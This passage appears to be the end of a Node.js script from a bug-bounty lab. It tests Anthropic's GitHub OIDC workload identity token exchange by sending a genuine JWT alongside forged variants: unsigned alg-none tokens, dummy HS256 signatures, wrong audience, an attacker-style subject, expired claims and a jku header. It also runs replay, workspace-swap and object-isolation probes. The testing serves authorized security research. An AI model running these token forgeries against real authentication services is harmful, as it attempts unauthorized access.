  const selected = variants[name];
  if (!selected) return null;
  const pairs = Array.isArray(selected[0]) ? selected : [selected];
  const missingPair = pairs.find(([, value]) => !value);
  if (missingPair) return { missing: missingPair[0] };
  return { fields: pairs.map(([field]) => field), overrides: Object.fromEntries(pairs) };
}

function classifySelectedExperiment(name, control, variant, safeClaims) {
  const wrongAudience = AUDIENCE !== "https://api.anthropic.com";
  const wrongRepo = safeClaims.repository !== "hyunjun12312/h1-anthropic-api-wif-jwt-lab";
  const wrongRef = safeClaims.ref !== "refs/heads/master";
  if (wrongAudience) {
    return control.access_token_returned
      ? "candidate_high_real_github_oidc_wrong_audience_accepted"
      : "rejected_real_github_oidc_wrong_audience_blocked";
  }
  if (wrongRepo) {
    return control.access_token_returned
      ? "candidate_high_real_github_oidc_wrong_repo_accepted"
      : "rejected_real_github_oidc_wrong_repo_blocked";
  }
  if (wrongRef) {
    return control.access_token_returned
      ? "candidate_high_real_github_oidc_wrong_ref_accepted"
      : "rejected_real_github_oidc_wrong_ref_blocked";
  }
  if (!control.access_token_returned) return "setup_failed_control_exchange_rejected";
  if (!variant) return "baseline_control_exchange_accepted";
  if (name === "alt_rule_and_alt_service_account") {
    return variant.access_token_returned
      ? "baseline_alt_rule_and_alt_service_account_accepted"
      : "setup_alt_rule_and_alt_service_account_rejected";
  }
  if (!variant.access_token_returned) return `rejected_${name}_blocked`;
  if (name.includes("service_account")) return "candidate_critical_service_account_selection_bypass";
  if (name.includes("organization")) return "candidate_critical_cross_org_exchange";
  if (name.includes("federation_rule")) return "candidate_high_federation_rule_not_bound";
  if (name.includes("workspace")) return "candidate_high_workspace_boundary_bypass";
  if (name.includes("replay")) return "candidate_high_jti_replay_accepted";
  return "candidate_high_boundary_check_accepted";
}

async function runLegacySuite(evidence, jwt, decoded, safeClaims) {
  const control = await exchange("control-real-github-oidc-jwt", jwt);
  evidence.exchange.results.push(control);

  const replay = await exchange("replay-same-real-github-oidc-jwt", jwt);
  evidence.exchange.results.push(replay);

  if (process.env.ANTHROPIC_ALT_WORKSPACE_ID) {
    evidence.exchange.results.push(
      await exchange("workspace-mismatch-alt-workspace-id", jwt, {
        workspace_id: process.env.ANTHROPIC_ALT_WORKSPACE_ID,
      }),
    );
  }

  if (typeof control._accessTokenForSmokeOnly === "string") {
    evidence.exchange.message_smoke = await messageSmoke(
      "control-access-token-message-smoke",
      control._accessTokenForSmokeOnly,
    );
  }

  const mutations = [
    ["unsigned-alg-none-same-claims", unsignedJwtFrom(decoded)],
    ["dummy-hs256-same-claims", dummySignedJwtFrom(decoded)],
    ["unsigned-wrong-audience", unsignedJwtFrom(decoded, { aud: "urn:h1-wrong-audience" })],
    [
      "unsigned-wrong-sub",
      unsignedJwtFrom(decoded, {
        sub: "repo:attacker/example:ref:refs/heads/main",
        repository: "attacker/example",
      }),
    ],
    ["unsigned-expired-token", unsignedJwtFrom(decoded, { iat: 1, nbf: 1, exp: 2 })],
    [
      "unsigned-jku-header",
      unsignedJwtFrom(decoded, {}, { jku: "https://example.invalid/.well-known/jwks.json", kid: "h1-jku-test" }),
    ],
  ];
  for (const [label, assertion] of mutations) {
    evidence.exchange.results.push(await exchange(label, assertion));
  }

  const acceptedBoundaryBypasses = evidence.exchange.results.filter(
    (item) => item.label !== "control-real-github-oidc-jwt" && item.access_token_returned,
  );
  if (!control.access_token_returned) {
    evidence.classification = classifySelectedExperiment("legacy_suite", control, null, safeClaims);
  } else if (acceptedBoundaryBypasses.length) {
    evidence.classification = "candidate_high_boundary_check_accepted";
  } else {
    evidence.classification = "rejected_mutated_jwts_blocked";
  }
}

async function runSelectedExperiment(evidence, jwt, safeClaims) {
  const control = await exchange("control-real-github-oidc-jwt", jwt);
  evidence.exchange.results.push(control);

  let variant = null;
  if (EXPERIMENT === "baseline") {
    // Baseline only: prove the valid GitHub OIDC token can still mint a scoped Anthropic token.
  } else if (EXPERIMENT === "replay_same_jti") {
    variant = await exchange("variant-replay-same-real-github-oidc-jwt", jwt);
    evidence.exchange.results.push(variant);
  } else {
    const selected = variantForExperiment(EXPERIMENT);
    if (!selected) {
      evidence.classification = `setup_unknown_experiment_${EXPERIMENT}`;
      return;
    }
    if (selected.missing) {
      evidence.classification = `setup_missing_${selected.missing}_for_${EXPERIMENT}`;
      return;
    }
    const variantJwt = await getGithubOidc(AUDIENCE);
    const variantDecoded = decodeJwt(variantJwt);
    evidence.exchange.variant_github_oidc = {
      note: "Fresh GitHub OIDC JWT used for the variant exchange so mismatch failures are not confused with JTI replay protection.",
      requested_audience: AUDIENCE,
      jwt_sha256_only: sha256(variantJwt),
      safe_claims: safeClaimsFromDecoded(variantDecoded),
    };
    evidence.exchange.variant_request_body_fingerprint = fingerprintExchangeOverrides(selected.overrides);
    variant = await exchange(`variant-${EXPERIMENT}`, variantJwt, selected.overrides);
    evidence.exchange.results.push(variant);
  }

  if (typeof control._accessTokenForSmokeOnly === "string" && EXPERIMENT === "baseline") {
    evidence.exchange.message_smoke = await messageSmoke(
      "control-access-token-message-smoke",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.file_smoke = await fileSmoke(
      "control-access-token-owned-file-smoke",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.batch_smoke = await batchSmoke(
      "control-access-token-owned-batch-smoke",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.file_lifecycle_smoke = await fileLifecycleSmoke(
      "control-access-token-file-lifecycle-smoke",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.batch_lifecycle_smoke = await batchLifecycleSmoke(
      "control-access-token-batch-lifecycle-smoke",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.wif_token_vs_api_key_b_object_isolation = await wifTokenVsApiKeyBObjectIsolation(
      "control-a-wif-token-vs-api-key-b-object-isolation",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.cross_workspace_object_isolation = await crossWorkspaceObjectIsolation(
      "control-a-token-cross-workspace-object-isolation",
      jwt,
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.admin_smoke = await adminSmoke(
      "control-access-token-admin-api-smoke",
      control._accessTokenForSmokeOnly,
    );
  }

  const selectedClassification = classifySelectedExperiment(EXPERIMENT, control, variant, safeClaims);
  const apiKeyBIsolationStatus = evidence.exchange.wif_token_vs_api_key_b_object_isolation?.status;
  if (typeof apiKeyBIsolationStatus === "string" && apiKeyBIsolationStatus.startsWith("candidate_")) {
    evidence.classification = apiKeyBIsolationStatus;
  } else if (apiKeyBIsolationStatus === "wif_a_token_blocked_from_api_key_b_objects") {
    evidence.classification = "rejected_wif_token_object_scope_bypass_blocked";
  } else {
    evidence.classification = selectedClassification;
  }
}

async function main() {
  await mkdir(OUT_DIR, { recursive: true });
  const jwt = await getGithubOidc(AUDIENCE);
  const decoded = decodeJwt(jwt);
  const safeClaims = safeClaimsFromDecoded(decoded);

  const evidence = {
    generated_at: new Date().toISOString(),
    scope_asset: "api.anthropic.com / API & SDKs",
    claim_tested: "GitHub OIDC JWT claim collection and selected Anthropic WIF token-exchange boundary checks.",
    experiment: {
      name: EXPERIMENT,
      one_variable_at_a_time: EXPERIMENT !== "legacy_suite",
      expected_non_vulnerable: "Only the exact configured GitHub OIDC subject/audience/rule/service-account/workspace/org combination should mint a token.",
      vulnerable_if: "A token is minted when a request-controlled org/workspace/rule/service_account parameter is swapped away from the configured target.",
    },
    safety: {
      github_oidc_jwt_not_logged: true,
      github_oidc_jwt_sha256_only: sha256(jwt),
      anthopic_access_tokens_not_logged: true,
      no_third_party_data_accessed: true,
    },
    github_oidc: {
      requested_audience: AUDIENCE,
      header: decoded.header,
      signature_length: decoded.signature_length,
      signature_sha256: decoded.signature_sha256,
      safe_claims: safeClaims,
      suggested_rule_condition:
        safeClaims.repository && safeClaims.sub
          ? `repository == '${safeClaims.repository}' and sub == '${safeClaims.sub}'`
          : null,
    },
    exchange: {
      attempted: process.env.RUN_EXCHANGE === "true",
      missing_variables: requireExchangeVars(),
      results: [],
      variant_github_oidc: null,
      message_smoke: null,
      file_smoke: null,
      batch_smoke: null,
      file_lifecycle_smoke: null,
      batch_lifecycle_smoke: null,
      wif_token_vs_api_key_b_object_isolation: null,
      cross_workspace_object_isolation: null,
      admin_smoke: null,
    },
    classification: "claims_collected_only",
  };

  if (process.env.RUN_EXCHANGE === "true") {
    if (evidence.exchange.missing_variables.length) {
      evidence.classification = "setup_incomplete_missing_anthropic_wif_variables";
    } else if (EXPERIMENT === "legacy_suite") {
      await runLegacySuite(evidence, jwt, decoded, safeClaims);
    } else {
      await runSelectedExperiment(evidence, jwt, safeClaims);
    }
  }

  const outPath = `${OUT_DIR}/anthropic-wif-jwt-boundary-evidence.json`;
  await writeFile(outPath, `${JSON.stringify(evidence, null, 2)}\n`);
  console.log(
    JSON.stringify(
      {
        outPath,
        classification: evidence.classification,
        experiment: evidence.experiment,
        safe_claims: evidence.github_oidc.safe_claims,
        suggested_rule_condition: evidence.github_oidc.suggested_rule_condition,
        exchange: {
          attempted: evidence.exchange.attempted,
          missing_variables: evidence.exchange.missing_variables,
          variant_github_oidc: evidence.exchange.variant_github_oidc
            ? {
                requested_audience: evidence.exchange.variant_github_oidc.requested_audience,
                jwt_sha256_only: evidence.exchange.variant_github_oidc.jwt_sha256_only,
                safe_claims: evidence.exchange.variant_github_oidc.safe_claims,
              }
            : null,
          variant_request_body_fingerprint: evidence.exchange.variant_request_body_fingerprint || null,
          summary: evidence.exchange.results.map((item) => ({
            label: item.label,
            status: item.status,
            access_token_returned: item.access_token_returned,
            error_type: item.error_type,
            error_message: item.error_message,
          })),
          message_smoke: evidence.exchange.message_smoke
            ? {
                status: evidence.exchange.message_smoke.status,
                ok: evidence.exchange.message_smoke.ok,
                message_id: evidence.exchange.message_smoke.message_id,
                error_type: evidence.exchange.message_smoke.error_type,
              }
            : null,
          file_smoke: evidence.exchange.file_smoke
            ? {
                create_status: evidence.exchange.file_smoke.create.status,
                create_ok: evidence.exchange.file_smoke.create.ok,
                file_id_returned: evidence.exchange.file_smoke.create.file_id_returned,
                retrieve_status: evidence.exchange.file_smoke.retrieve?.status ?? null,
                retrieve_ok: evidence.exchange.file_smoke.retrieve?.ok ?? null,
                cleanup_status: evidence.exchange.file_smoke.cleanup?.status ?? null,
                cleanup_ok: evidence.exchange.file_smoke.cleanup?.ok ?? null,
              }
            : null,
          batch_smoke: evidence.exchange.batch_smoke
            ? {
                create_status: evidence.exchange.batch_smoke.create.status,
                create_ok: evidence.exchange.batch_smoke.create.ok,
                batch_id_returned: evidence.exchange.batch_smoke.create.batch_id_returned,
                retrieve_status: evidence.exchange.batch_smoke.retrieve?.status ?? null,
                retrieve_ok: evidence.exchange.batch_smoke.retrieve?.ok ?? null,
                cancel_status: evidence.exchange.batch_smoke.cancel?.status ?? null,
                cancel_ok: evidence.exchange.batch_smoke.cancel?.ok ?? null,
              }
            : null,
          file_lifecycle_smoke: evidence.exchange.file_lifecycle_smoke
            ? {
                create_status: evidence.exchange.file_lifecycle_smoke.create.status,
                pre_delete_metadata_status: evidence.exchange.file_lifecycle_smoke.pre_delete_metadata?.status ?? null,
                delete_status: evidence.exchange.file_lifecycle_smoke.delete?.status ?? null,
                post_delete_metadata_status: evidence.exchange.file_lifecycle_smoke.post_delete_metadata?.status ?? null,
                post_delete_metadata_ok: evidence.exchange.file_lifecycle_smoke.post_delete_metadata?.ok ?? null,
                post_delete_content_status: evidence.exchange.file_lifecycle_smoke.post_delete_content?.status ?? null,
                post_delete_content_ok: evidence.exchange.file_lifecycle_smoke.post_delete_content?.ok ?? null,
                candidate_stale_read: evidence.exchange.file_lifecycle_smoke.candidate_stale_read,
              }
            : null,
          batch_lifecycle_smoke: evidence.exchange.batch_lifecycle_smoke
            ? {
                create_status: evidence.exchange.batch_lifecycle_smoke.create.status,
                pre_cancel_metadata_status: evidence.exchange.batch_lifecycle_smoke.pre_cancel_metadata?.status ?? null,
                pre_cancel_results_status: evidence.exchange.batch_lifecycle_smoke.pre_cancel_results?.status ?? null,
                cancel_status: evidence.exchange.batch_lifecycle_smoke.cancel?.status ?? null,
                post_cancel_metadata_status: evidence.exchange.batch_lifecycle_smoke.post_cancel_metadata?.status ?? null,
                post_cancel_results_status: evidence.exchange.batch_lifecycle_smoke.post_cancel_results?.status ?? null,
                post_cancel_results_ok: evidence.exchange.batch_lifecycle_smoke.post_cancel_results?.ok ?? null,
                candidate_unexpected_results_access: evidence.exchange.batch_lifecycle_smoke.candidate_unexpected_results_access,
              }
            : null,
          wif_token_vs_api_key_b_object_isolation: evidence.exchange.wif_token_vs_api_key_b_object_isolation
            ? {
                status: evidence.exchange.wif_token_vs_api_key_b_object_isolation.status,
                file_create_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file?.create_with_b_api_key?.status ?? null,
                owner_b_file_content_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file?.owner_b_content?.status ?? null,
                owner_b_file_marker_present:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file?.owner_b_content
                    ?.marker_present_in_body ?? null,
                cross_a_wif_file_content_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file?.cross_a_wif_content?.status ?? null,
                cross_a_wif_file_marker_present:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file?.cross_a_wif_content
                    ?.marker_present_in_body ?? null,
                cross_a_wif_spoofed_file_content_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file
                    ?.cross_a_wif_with_b_workspace_headers_content?.status ?? null,
                cross_a_wif_spoofed_file_marker_present:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.file
                    ?.cross_a_wif_with_b_workspace_headers_content?.marker_present_in_body ?? null,
                batch_create_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.batch?.create_with_b_api_key?.status ?? null,
                cross_a_wif_batch_metadata_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.batch?.cross_a_wif_metadata?.status ?? null,
                cross_a_wif_spoofed_batch_metadata_status:
                  evidence.exchange.wif_token_vs_api_key_b_object_isolation.batch
                    ?.cross_a_wif_with_b_workspace_headers_metadata?.status ?? null,
              }
            : null,
          cross_workspace_object_isolation: evidence.exchange.cross_workspace_object_isolation
            ? {
                status: evidence.exchange.cross_workspace_object_isolation.status,
                missing_b_variables: evidence.exchange.cross_workspace_object_isolation.missing_b_variables,
                b_token_minted: evidence.exchange.cross_workspace_object_isolation.b_exchange?.access_token_returned ?? null,
                file_b_retrieve_status: evidence.exchange.cross_workspace_object_isolation.file?.retrieve_with_b?.status ?? null,
                file_b_retrieve_ok: evidence.exchange.cross_workspace_object_isolation.file?.retrieve_with_b?.ok ?? null,
                batch_b_retrieve_status: evidence.exchange.cross_workspace_object_isolation.batch?.retrieve_with_b?.status ?? null,
                batch_b_retrieve_ok: evidence.exchange.cross_workspace_object_isolation.batch?.retrieve_with_b?.ok ?? null,
              }
            : null,
          admin_smoke: evidence.exchange.admin_smoke
            ? {
                any_admin_endpoint_ok: evidence.exchange.admin_smoke.any_admin_endpoint_ok,
                summary: evidence.exchange.admin_smoke.results.map((item) => ({
                  auth_mode: item.auth_mode,
                  name: item.name,
                  status: item.status,
                  ok: item.ok,
                  error_type: item.error_type,
                  error_message: item.error_message,
                })),
              }
            : null,
        },
      },
      null,
      2,
    ),
  );
}

main().catch((error) => {
  console.error(error instanceof Error ? error.stack || error.message : String(error));
  process.exit(1);
});
